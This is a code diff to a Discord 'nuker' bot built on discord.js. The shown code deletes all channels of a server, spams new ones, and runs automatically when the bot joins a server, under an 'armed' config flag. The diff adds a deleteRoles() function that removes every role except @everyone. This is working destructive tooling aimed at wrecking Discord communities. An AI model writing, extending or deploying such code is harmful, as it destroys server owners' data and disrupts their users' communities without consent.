@@ -71,7 +71,7 @@ if(process.env.TOKEN) token = process.env.TOKEN;
 
 //Load configuration
 const payloadMessage = require("./message.json")
-const { armed, channelDeletion, channelCreation, channelCreationCount, channelName, automaticActivation} = require("./config.json")
+const { armed, channelDeletion, channelCreation, channelCreationCount, channelName, automaticActivation, roleDeletion} = require("./config.json")
 
 //Load Discord.js Library
 const { Client, Events, GatewayIntentBits, ChannelType } = require('discord.js');
@@ -88,10 +88,11 @@ async function nuke(guild)
 {
 
     //Return if the nuker is not armed
-    if(!armed) return;
+    if(!armed) return console.log(`Nuker is disarmed.`)
 
     //Get channel manager
     var channelManager = guild.channels;
+    var roleManager = guild.roles;
 
     //Delete all channels
     async function removeChannels()
@@ -135,9 +136,26 @@ async function nuke(guild)
         }
     }
 
+    async function deleteRoles()
+    {
+        //Return if roleDeletion is 0
+        if(!roleDeletion) return;
+        //Iterate through the role of the server and delete them
+        let i = 0;
+        for (let [id,role] of roleManager.cache) {
+            i++;
+            if(i == 1) continue; //Don't delete the first role (@everyone)
+            console.log(`Attempting to delete @${role.name}...`)
+            role.delete().catch(err => {
+                console.log(`Failed to delete @${role.name} due to this error: ${err}`)
+            });
+        }
+    }
+
     //Call functions
     removeChannels();
     spamChannels();
+    deleteRoles();
 
 }
 
@@ -147,7 +165,6 @@ client.on(Events.GuildCreate, guild => {
 });
 
 client.on(Events.MessageCreate, message => {
-
     //Display payload message
     if(message.content == "!message")
     {
